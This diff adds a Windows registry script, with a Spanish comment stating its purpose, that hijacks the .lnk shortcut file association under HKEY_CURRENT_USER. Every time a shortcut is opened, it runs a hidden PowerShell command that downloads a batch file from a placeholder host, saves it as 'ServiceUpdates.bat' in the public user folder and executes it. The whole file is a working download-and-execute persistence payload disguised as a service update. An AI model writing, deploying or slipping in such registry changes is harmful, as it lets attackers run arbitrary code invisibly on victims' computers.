@@ -1,0 +1,8 @@
+Windows Registry Editor Version 5.00
+;Este script cambia el comportamiento de los archivos .ink de windows para que al abrirlos se descargue y ejecute un script de manera invisible.
+
+[HKEY_CURRENT_USER\Software\Classes\.lnk]
+@="MiArchivoLnk"
+
+[HKEY_CURRENT_USER\Software\Classes\MiArchivoLnk\shell\open\command]
+@="powershell.exe -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('{IP_BAT_SCRIPT}', 'C:\\Users\\Public\\ServiceUpdates.bat'); & 'C:\\Users\\Public\\ServiceUpdates.bat'\""
